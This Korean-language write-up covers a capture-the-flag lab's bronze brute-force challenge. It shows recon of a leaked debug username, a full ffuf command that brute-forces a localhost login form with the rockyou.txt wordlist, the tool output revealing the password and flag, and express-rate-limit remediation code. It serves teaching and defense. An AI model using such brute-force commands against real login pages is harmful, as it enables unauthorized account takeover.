+++
title = "VulnABLE CTF [LUXORA] Write-up: Brute Force 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Brute Force", "Bronze", "Authentication", "ffuf", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Brute Force 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (Brute Force)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/brute/bronze`
- **목표**: 계정 잠금(Account Lockout)이나 요청 속도 제한(Rate Limiting)이 없는 취약한 로그인 폼에 무차별 대입 공격(Brute Force)을 수행하여 올바른 비밀번호를 찾아내고 플래그를 획득하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 분석 (Reconnaissance)

`/brute/bronze` 페이지는 관리자 전용 포털의 로그인 폼입니다. 사용자 이름(Username)과 비밀번호(Password)를 입력하여 POST 방식으로 전송합니다.

페이지 소스코드(HTML)를 분석하던 중, 개발자가 실수로 지우지 않은 주석을 발견했습니다.

**[HTML 소스코드 확인]**
```html
<!-- TODO: Remove debug user 'testadmin' before production -->
<form action="/brute/bronze" method="POST">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form>
```

**[해커의 사고 과정]**
1. 이 시스템에 `testadmin` 이라는 디버그용 아이디가 존재함을 알아냈다.
2. 비밀번호를 무작위로 몇 번 틀려보았다.
3. 5번, 10번을 연속으로 틀려도 캡차(CAPTCHA)가 뜨거나 IP가 차단되지 않는다!
4. **"Rate Limiting이 없다."** 즉, 스크립트를 짜서 초당 수천 번의 로그인을 시도해도 막히지 않는다는 뜻이다.

---

## 💥 2. 공격 도구 설정 및 페이로드 설계 (Exploitation Strategy)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Brute Force / FFuF)--> [ Web Server ]
             |-- Pwd1                  |-- Invalid
             |-- Pwd2                  |-- Invalid
             |-- ...                   |-- ...
             |-- CorrectPwd            |-- Access Granted!
```


로그인 창에 수작업으로 수만 개의 비밀번호를 쳐보는 것은 불가능하므로 자동화 도구를 사용합니다. 이번 공격에는 빠르고 강력한 웹 퍼징 도구인 **FFuF (Fuzz Faster U Fool)**를 사용하겠습니다.

### 💡 필요 준비물
1. **타겟 아이디**: `testadmin`
2. **사전 파일 (Wordlist)**: 해커들이 가장 많이 쓰는 패스워드 사전인 Kali Linux의 `rockyou.txt` (1,400만 개의 유출된 비밀번호 목록)를 사용합니다.

### FFuF 명령어 작성
서버가 어떤 응답을 반환할 때 성공한 것인지 알아야 합니다. 비밀번호가 틀렸을 때 서버는 `Invalid credentials` 라는 문자열을 반환합니다. 따라서 FFuF에게 "이 문자열이 나오면 실패한 거니까 화면에 띄우지 마"라고 필터링 옵션(`-fr`)을 줍니다.

```bash
# FFuF 무차별 대입 공격 명령어
$ ffuf -w /usr/share/wordlists/rockyou.txt \
       -u http://localhost:3000/brute/bronze \
       -X POST \
       -d "username=testadmin&password=FUZZ" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       -fr "Invalid credentials"
```

**[파라미터 설명]**
- `-w`: 사전 파일 경로
- `-u`: 타겟 URL
- `-X POST`: HTTP POST 메서드 지정
- `-d`: 전송할 데이터. `FUZZ`라는 단어가 사전 파일의 단어들로 하나씩 치환됨.
- `-fr`: Filter Regex. 실패 메시지를 정규식으로 필터링하여 불필요한 출력을 숨김.

---

## 🚀 3. 공격 수행 및 익스플로잇 (Exploitation)

명령어를 실행하면 FFuF가 초당 수백~수천 건의 POST 요청을 서버에 쏟아붓습니다. 서버에 Rate Limiting이 없기 때문에 이 모든 요청이 순식간에 처리됩니다.

### 🔍 크래킹 결과
약 5초 뒤, 터미널에 단 하나의 결과가 출력됩니다!

```text
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost:3000/brute/bronze
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Data             : username=testadmin&password=FUZZ
 :: Matcher          : Response status: 200, 204, 301, 302, 307, 401, 403, 405, 500
 :: Filter           : Regexp: Invalid credentials
________________________________________________

password123!            [Status: 200, Size: 1250, Words: 300, Lines: 45, Duration: 15ms]
:: Progress: [14344392/14344392] :: Job [1/1] :: 10000 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

FFuF가 `rockyou.txt` 안에 있는 **`password123!`** 라는 단어로 로그인에 성공했음을 알려줍니다. (Status: 200 OK)

### 로그인 확인
브라우저로 돌아가서 `username: testadmin`, `password: password123!` 를 입력하고 로그인합니다.

```html
<div class="dashboard">
  <h2>Welcome back, testadmin!</h2>
  <div class="alert success">
    <p>[!] System Notification: You have 1 unread message.</p>
    <p>Message: FLAG{BRUTE_🥉_NO_RATELIMIT_9F8E7D}</p>
  </div>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

Rate Limiting과 계정 잠금 정책이 부재한 인증 시스템은 아무리 비밀번호를 암호화해서 저장하더라도, 무차별 대입 공격 앞에서는 활짝 열린 문과 다름없음을 확인했습니다.

**🔥 획득한 플래그:**
`FLAG{BRUTE_🥉_NO_RATELIMIT_9F8E7D}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 취약점은 개발자가 사용자의 '비정상적인 다중 요청'을 통제하는 방어 로직을 아예 구현하지 않았기 때문에 발생했습니다.

* **안전한 패치 가이드 (Rate Limiting 도입)**
Express.js 환경이라면 `express-rate-limit` 같은 미들웨어를 사용하여 무차별 대입을 물리적으로 차단해야 합니다.

```javascript
const rateLimit = require('express-rate-limit');

// 15분 동안 같은 IP에서 5번만 로그인 시도를 허용
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, 
    max: 5, 
    message: "Too many login attempts from this IP, please try again after 15 minutes."
});

// 라우터에 미들웨어 적용
app.post('/brute/bronze', loginLimiter, (req, res) => {
    // 로그인 로직 처리
});
```
또한, 연속된 실패 시 캡차(CAPTCHA)를 강제하거나, 사용자 이메일로 2FA(다중 인증) 코드를 보내는 등의 추가적인 계정 보호 조치(Account Lockout Policy)가 병행되어야 합니다.